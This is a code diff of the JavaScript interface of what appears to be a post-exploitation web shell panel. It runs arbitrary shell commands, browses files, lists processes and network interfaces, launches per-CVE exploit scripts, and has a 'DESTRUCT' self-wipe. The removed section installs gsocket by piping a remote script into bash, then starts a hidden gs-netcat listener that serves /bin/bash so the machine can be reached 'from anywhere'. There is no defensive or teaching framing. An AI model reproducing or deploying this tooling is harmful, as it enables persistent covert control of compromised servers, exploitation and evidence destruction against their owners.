-$('bc').innerHTML=p.split('/').filter(Boolean).reduce((a,x,i,arr)=>{const fp='/'+arr.slice(0,i+1).join('/');return a+` / <a href="#" onclick="ls('${fp}');return false" style="color:var(--accent)">${x}</a>`;},'<a href="#" onclick="ls(\'/\');return false" style="color:var(--accent)">/</a>');
-let h='';if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="file" onclick="ls('${pr}')"><div class="file-i">◂</div><div class="file-n">..</div></div>`;}
-for(const f of d.files||[]){const np=p==='/'?'/'+f.name:p+'/'+f.name;h+=`<div class="file" onclick="${f.type==='dir'?`ls('${np}')`:'0'}"><div class="file-i">${f.type==='dir'?'▸':'◦'}</div><div class="file-n">${f.name}</div><div class="file-s">${f.size||''}</div></div>`;}
-$('fls').innerHTML=h||'<div style="padding:16px;color:var(--text2);text-align:center">Empty</div>';}
-
-async function rc(){const c=$('tc').value.trim();if(!c)return;$('tc').value='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,l.includes('error')?'err':'ok'));}
-
-async function cfg(){const r=await api('url');$('curl').innerText=r.url||'-';}
-async function pull(){log('so','Updating...');const r=await api('pull');alert(r.output||'Done');location.reload();}
-async function nuke(){if(!confirm('⚠ DESTRUCT ALL?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;font-size:24px;color:var(--red)">DESTROYED</div>';}
-
-async function gsInstall(){
-const k=$('gsk').value.trim()||Math.random().toString(36).substr(2,12);
-$('gso').innerHTML='';
-log('gso','Installing gsocket...','cmd');
-const steps=[
-{c:'command -v gs-netcat || (curl -sSL https://gsocket.io/y|bash)',m:'Checking/Installing gsocket...'},
-{c:`echo '${k}' > /tmp/.z/.gsk`,m:'Saving secret key...'},
-{c:`nohup gs-netcat -s ${k} -l -e /bin/bash >/dev/null 2>&1 &`,m:'Starting hidden listener...'},
-{c:'sleep 1 && pgrep -f gs-netcat',m:'Verifying...'}
-];
-for(const s of steps){
-log('gso',s.m,'info');
-const r=await api('exec',{cmd:s.c});
-if(r.output)log('gso',r.output,'ok');
-await new Promise(r=>setTimeout(r,500));
+if(d.exploits?.length){for(const x of d.exploits){log('slog',`${x.cve} - ${x.name} [${x.rate}%]`,'ok');}
+let h='<div style="margin-top:12px">';for(const x of d.exploits.slice(0,3)){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
+h+='</div>';$('scan').innerHTML+='<div style="margin-top:12px">'+h+'</div>';}else log('slog','No exploits found','err');}
+catch(e){log('slog',r.output||'Error','err');}}
+async function scan(){
+$('expl').innerHTML='<div style="color:var(--text2)">Scanning...</div>';
+const r=await api('run',{path:'exploits/gate.sh'});
+try{const d=JSON.parse(r.output||'{}');
+if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}$('expl').innerHTML=h;}
+else $('expl').innerHTML='<div style="color:var(--text2)">No exploits</div>';}catch(e){$('expl').innerHTML=`<div style="color:var(--red)">${r.output}</div>`;}}
+async function runE(cve){if(!confirm('Execute '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');scan();}
+async function rs(p){if(!p)return;clear('so');log('so','$ '+p,'cmd');const r=await api('run',{path:p});(r.output||'').split('\n').forEach(l=>log('so',l,'ok'));}
+async function rc(){const c=$('tc').value.trim();if(!c)return;$('tc').value='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,l.toLowerCase().includes('error')?'err':'ok'));}
+async function rc2(c){clear('to');log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,'ok'));nav('term');}
+async function loadProc(){clear('po');log('po','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem | head -30'});(r.output||'').split('\n').forEach(l=>log('po',l,'info'));}
+async function loadNet(){clear('no');log('no','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null'});(r.output||'').split('\n').forEach(l=>log('no',l,'info'));log('no','','');log('no','$ ip a','cmd');const r2=await api('exec',{cmd:'ip a 2>/dev/null | grep -E "inet |ether "'});(r2.output||'').split('\n').forEach(l=>log('no',l,'info'));}
+async function ls(p){
+cwd=p;
+$('bc').innerHTML=p.split('/').filter(Boolean).reduce((a,x,i,arr)=>{const fp='/'+arr.slice(0,i+1).join('/');return a+`<span>/</span><a href="#" onclick="ls('${fp}');return false">${x}</a>`;},'<a href="#" onclick="ls(\'/\');return false">root</a>');
+const d=await api('files',{path:p});
+let h='';
+if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" onclick="ls('${pr}')"><div class="fm-icon dir">↑</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;}
+for(const f of(d.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name))){
+const np=p==='/'?'/'+f.name:p+'/'+f.name;
+const isDir=f.type==='dir';
+const ext=f.name.split('.').pop().toLowerCase();
+const icons={dir:'📁',sh:'⚡',py:'🐍',js:'📜',json:'{}',txt:'📄',log:'📋',conf:'⚙',html:'🌐',css:'🎨',c:'©',h:'©'};
+const icon=isDir?'📁':(icons[ext]||'📄');
+h+=`<div class="fm-item" onclick="${isDir?`ls('${np}')`:`preview('${np}')`}"><div class="fm-icon ${isDir?'dir':''}">${icon}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} ${f.size||''} ${f.mod||''}</div></div></div>`;}
+$('fls').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--text2)">Empty</div>';
+$('fpreview').innerHTML='';
 }
-log('gso','','');
-log('gso','✓ GSSocket installed!','ok');
-log('gso','Secret: '+k,'ok');
-log('gso','','');
-log('gso','Connect from anywhere:','info');
-log('gso','  gs-netcat -s '+k,'cmd');
+async function preview(p){
+const r=await api('read',{path:p});
+const ext=p.split('.').pop().toLowerCase();
+const isText=['sh','txt','log','conf','py','js','json','html','css','c','h','md','xml','yml','yaml','ini'].includes(ext);
+if(r.content&&isText){$('fpreview').innerHTML=`<div class="fm-preview">${r.content.replace(/</g,'&lt;').substring(0,2000)}</div>`;}
+else{$('fpreview').innerHTML=`<div class="fm-preview" style="color:var(--text2)">${p}\n\nBinary or large file</div>`;}
 }
-
-async function gsStatus(){
-$('gso').innerHTML='';
-const r=await api('exec',{cmd:'pgrep -a gs-netcat; cat /tmp/.z/.gsk 2>/dev/null'});
-if(r.output&&r.output.trim()){log('gso','GSSocket is running','ok');log('gso',r.output,'info');}
-else{log('gso','GSSocket not running','err');}
-}
-
-init();ls('/');cfg();
+async function pull(){const r=await api('pull');alert('Updated');location.reload();}
+async function nuke(){if(!confirm('⚠ DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px;letter-spacing:4px">DESTROYED</div>';}
+init();
 </script>
 </body></html>
